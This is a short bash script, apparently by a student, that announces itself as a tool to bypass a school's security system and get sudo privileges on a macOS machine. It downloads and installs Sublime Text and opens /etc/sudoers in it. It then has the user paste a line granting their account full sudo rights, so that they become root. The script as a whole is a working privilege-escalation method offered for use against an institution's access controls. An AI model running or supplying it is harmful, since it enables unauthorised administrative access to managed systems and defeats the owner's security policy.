#!/usr/bin/env bash

CURRENT=$(pwd)

BLUE="\033[34m";
RED="\033[31m";
BOLD="\033[1m";
# No color
NC="\033[0m";


banner(){
    cat << EOF
  ________        __ __________               __            .__     
 /  _____/  _____/  |\______   \ ____   _____/  |_     _____|  |__  
/   \  ____/ __ \   __\       _//  _ \ /  _ \   __\   /  ___/  |  \ 
\    \_\  \  ___/|  | |    |   (  <_> |  <_> )  |     \___ \|   Y  \\
 \______  /\___  >__| |____|_  /\____/ \____/|__| /\ /____  >___|  /
        \/     \/            \/                   \/      \/     \/ 
                By Siddharth Dushantha (sdushantha)
 Tool to bypass my school's security system to get sudo privileges
EOF
}


setUpSublimeText(){

    # Downloads Sublime Text from the url below. Yes, the url is hard coded and needs to be updated
    # When a new version comes out. I could extract the url from the webpage using regex but
    # I am not a bash god, so I am trying to keep this script simple for now
    printf "${BLUE}==>${NC} ${BOLD}Downloading https://download.sublimetext.com/Sublime Text Build 3176.dmg${NC}\n"
    curl https://download.sublimetext.com/Sublime%20Text%20Build%203176.dmg --output "Sublime Text.dmg" -s
    printf "${BLUE}==>${NC} ${BOLD}Download complete${NC}\n"
    
    printf "${BLUE}==>${NC} ${BOLD}Mounting${NC} ${BLUE}Sublime Text.dmg ${NC}\n"

    # Using the -quiet prevents alot of text pouring out. Maybe I could add a argument to this script
    # where the user can have a very verbose output if they want. All I would have to do is, to remove
    # quiet from the command below
    hdiutil attach "Sublime Text.dmg" -quiet

    cd "/Volumes/Sublime Text/"
    printf "${BLUE}==>${NC} ${BOLD}Moving${NC} ${BLUE}Sublime Text.app${NC} ${BOLD}to${NC} ${BLUE}Application${NC} ${BOLD}folder\n${NC}"
    cp -R "Sublime Text.app" Applications
   
    cd ..
    
    printf "${BLUE}==>${NC} ${BOLD}Unmounting${NC} ${BLUE}Sublime Text.dmg${NC}\n"
    hdiutil detach "Sublime Text" -quiet
    
    # Moving back to the current working directory so that I can delete the Sublime Text.dmg
    # which is located in the current working directory
    cd $CURRENT

    printf "${BLUE}==>${NC} ${BOLD}Deleting${NC} ${BLUE}Sublime Text.dmg${NC}\n"

    # Allways leave the place neater than you found it :)
    rm "Sublime Text.dmg"

}


# Who doesnt like a cool banner?
banner
echo

setUpSublimeText

echo

# The user has to open Sublime Text them self. I cant do it from a script
# because right after downloading Sublime Text, it is an ap from 
# an untrusted developer.
read -p "Press RETURN *after* opening Sublime Text"

# After they open Sublime Text, I can use the command below 
# to open /etc/sudoers using Sublime Text
open -a "Sublime Text" /etc/sudoers

printf "${BLUE}==>${NC} ${BOLD}Paste the text below into the file which will be opened now${NC}\n"
echo $USER "ALL=(ALL:ALL)      ALL"
printf "${BLUE}==>${NC} ${BOLD}Then save the file and type in the password when prompted${NC}\n"


printf "${BLUE}==>${NC} ${BOLD}Afer saving the file you can become${NC} ${RED}${BOLD}root${NC}${BOLD}!${NC} 🎉\n"

printf "Try running a command with 'sudo' or type 'sudo su' and \nthen 'whoami' to see if you got root\n"
